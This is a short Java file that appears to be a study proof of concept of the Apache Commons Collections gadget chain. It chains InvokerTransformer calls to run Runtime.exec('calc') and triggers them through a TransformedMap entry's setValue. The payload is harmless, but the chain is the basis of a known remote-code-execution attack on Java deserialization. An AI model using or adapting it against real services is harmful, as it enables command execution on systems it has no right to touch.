package test;


import java.io.File;
import java.io.FileOutputStream;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class orign {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                    new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, 
                    new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, 
                    new Object[]{"calc"})
        };
//        transformers[0].transform("ss");
        Transformer chain = new ChainedTransformer(transformers) ;
//        chain.transform("xx");
        Map innerMap = new HashMap() ;
        innerMap.put("name", "hello") ;
        Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;
//
        Map.Entry elEntry = (Entry) outerMap.entrySet().iterator().next() ;
        
        elEntry.setValue("helloxxx") ;
        System.out.print(elEntry.getValue());
    }
}